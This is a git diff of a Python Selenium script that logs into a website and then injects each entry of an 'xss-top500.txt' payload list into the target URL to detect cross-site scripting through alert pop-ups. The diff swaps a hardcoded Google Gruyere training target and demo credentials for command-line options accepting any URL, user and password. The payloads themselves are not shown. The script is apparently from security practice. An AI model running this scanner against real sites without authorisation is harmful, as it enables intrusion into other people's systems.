@@ -1,7 +1,7 @@
 import requests
 from bs4 import BeautifulSoup
 import time
-import sys
+import argparse
 
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
@@ -10,29 +10,15 @@ from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import TimeoutException
 
 
-# reg_url = "http://google-gruyere.appspot.com/start"
-
-base_url = "https://google-gruyere.appspot.com/618655413586375839657115594994104056558"
-# base_url = "https://www.facebook.com"
-
-
-#user login page with passed info
-url_login = base_url + "/login"
 
 
 browser = webdriver.Firefox()
 
 
 
-
-#info to create a new users
-user = "demo2019"
-password = "123456"
-
-
-
 #get all input fields to find crdentials login fields
-def getAllInputFields():
+def getAllInputFields(url):
+	url_login = url + "/login"
 	#add a session to the request
 	s = requests.session()
 	#send login request
@@ -66,7 +52,11 @@ def inputFieldLabels(inputFieldNames):
 
 
 #find login fields to pass credentials to
-def findLoginFields(browser,inputFieldNames, inputFieldLabels): 
+def findLoginFieldsAndLogin(browser,inputFieldNames, inputFieldLabels, url, user, password): 
+	#user login page with passed info
+	url_login = url + "/login"
+	#browse login url
+	browser.get(url_login) 
 	for i in range(len(inputFieldLabels)):
 		if "user" in inputFieldNames[i] or "user" in inputFieldLabels[i] or "email" in inputFieldNames[i] or "email" in inputFieldLabels[i]:
 			browser.find_element_by_name(inputFieldNames[i]).send_keys(user)
@@ -94,8 +84,8 @@ def findLoginButtonAndClick(browser):
 
 
 #handle if alert pops up to be able to go to the next script
-def handleAlert(browser, base_url, payload, sleep_time):
-  newurl = str(base_url)+"/"+str(payload)
+def handleAlert(browser, url, payload, sleep_time):
+  newurl = str(url)+"/"+str(payload)
   browser.get(newurl);
   try:
     WebDriverWait(browser, 1).until(EC.alert_is_present(),
@@ -121,23 +111,33 @@ def handleAlert(browser, base_url, payload, sleep_time):
 
 
 #injecting top500 xss scripts to the target
-def injectPayload(payloads):
+def injectPayload(payloads, url):
 	with open(payloads, "r") as pl:
 		print("started injecting payloads")
 	  	for payload in pl:
-	  		handleAlert(browser, base_url, payload, 1)
+	  		handleAlert(browser, url, payload, 1)
 
 
 
-inputs = getAllInputFields()
+
+
+
+parser = argparse.ArgumentParser(description='Pass arguments if necessary')
+
+parser.add_argument('-url', required=True, help='target url')
+parser.add_argument('-user', default="", help='username if you want to login')
+parser.add_argument('-password', default="", help='password if you want to login')
+
+
+args = parser.parse_args()
+
+
+inputs = getAllInputFields(url=args.url)
 inputFieldNames = inputFieldNames(inputs)
 inputFieldLabels = inputFieldLabels(inputFieldNames)
 
-#login to the url
-browser.get(url_login) 
-
-findLoginFields(browser, inputFieldNames, inputFieldLabels)		
+findLoginFieldsAndLogin(browser, inputFieldNames, inputFieldLabels, url=args.url, user=args.user, password=args.password)		
 findLoginButtonAndClick(browser)
-time.sleep(3)
+time.sleep(1)
 
-injectPayload("xss-top500.txt")
+injectPayload("xss-top500.txt", url=args.url)
